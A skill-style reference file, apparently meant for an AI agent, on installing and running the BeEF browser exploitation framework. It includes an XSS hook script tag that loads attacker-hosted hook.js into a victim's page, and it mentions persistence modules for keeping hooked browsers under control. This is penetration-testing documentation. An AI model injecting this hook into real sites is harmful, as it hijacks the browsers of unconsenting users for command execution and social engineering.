---
name: beef-xss
description: Hook web browsers to perform client-side attacks, command execution, and social engineering. Use when performing web application testing, exploitation of XSS vulnerabilities, or assessing the security posture of internal networks via a compromised browser beachhead.
---

# beef-xss

## Overview
The Browser Exploitation Framework (BeEF) is a penetration testing tool that focuses on the web browser. It allows testers to assess the security posture of a target environment by using client-side attack vectors. BeEF hooks one or more web browsers, using them as beachheads for launching directed command modules and further attacks against the system from within the browser context. Categories: Exploitation, Social Engineering, Web Application Testing.

## Installation (if not already installed)
Assume beef-xss is already installed. If you get a "command not found" error:

```bash
sudo apt update && sudo apt install beef-xss
```

## Common Workflows

### Starting the BeEF Service
On the first run, you will be prompted to set a new password for the `beef` user.
```bash
sudo beef-xss
```
Once started, the Web UI is typically available at `http://127.0.0.1:3000/ui/panel`.

### Hooking a Target Browser
Insert the following script tag into a page vulnerable to XSS or a page you control:
```html
<script src="http://<YOUR-IP>:3000/hook.js"></script>
```

### Stopping the BeEF Service
To safely shut down the framework and its background services:
```bash
sudo beef-xss-stop
```

## Complete Command Reference

### beef-xss
The primary wrapper script to initialize and start the BeEF service.

| Command | Description |
|---------|-------------|
| `beef-xss` | Starts the BeEF service, checks for default credentials, and opens the Web UI. |

### beef-xss-stop
The utility to stop the BeEF systemd service.

| Command | Description |
|---------|-------------|
| `beef-xss-stop` | Stops the `beef-xss.service` and kills associated ruby processes. |

### Internal Configuration
While the wrapper scripts handle service management, the core engine is located at `/usr/share/beef-xss/`. Configuration can be modified in:
- `/etc/beef-xss/config.yaml` (Global configuration)

## Notes
- **Default Credentials**: BeEF will refuse to start with the default password (`beef`). You must change it during the first execution or in the `config.yaml` file.
- **Network Access**: Ensure your firewall allows inbound traffic on port 3000 (default) for the hook to communicate back to the control panel.
- **Persistence**: The hook only remains active as long as the browser tab remains open. Use "Persistence" modules within BeEF to attempt to maintain access.
- **Dependencies**: BeEF relies on `nodejs` and `ruby`. If the service fails to start, check `journalctl -u beef-xss`.